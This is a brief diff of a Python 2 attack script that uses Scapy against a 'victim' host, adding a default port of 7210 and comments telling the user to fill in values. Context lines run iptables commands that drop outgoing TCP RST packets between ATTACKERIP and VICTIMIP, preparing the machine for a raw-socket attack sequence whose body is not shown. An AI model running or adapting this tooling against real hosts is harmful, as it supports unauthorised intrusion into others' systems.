@@ -42,7 +42,8 @@ def main():
         global port
         port = options.port
     else:
-        print "See usage. Review Help"
+        print "Using default port."
+        port=7210
 
     print "[*]-Port set to: "+str(port)
     print "[*]-Victim set to: "+victim 
@@ -68,7 +69,7 @@ def main():
     print "... Starting Attack Sequence ..."
     print
     
-    #Scapy uses raw sockets which will confuse the Linux Kernel.
+    #Scapy uses raw sockets which will confuse the Linux Kernel. SET THE PROPER VALUES
     os.system('iptables -A OUTPUT -p tcp -d ATTACKERIP -s VICTIMIP --dport 7210 --tcp-flags RST RST -j DROP')
     
     #Beginning of Attack Sequence
@@ -144,6 +145,7 @@ def main():
     
     print "Attack Sequence Completed - Exiting Program!"
     
+    #SET THE PROPER VALUES
     os.system('iptables -D OUTPUT -p tcp -d ATTACKERIP -s VICTIMIP --dport 7210 --tcp-flags RST RST -j DROP')
     
     
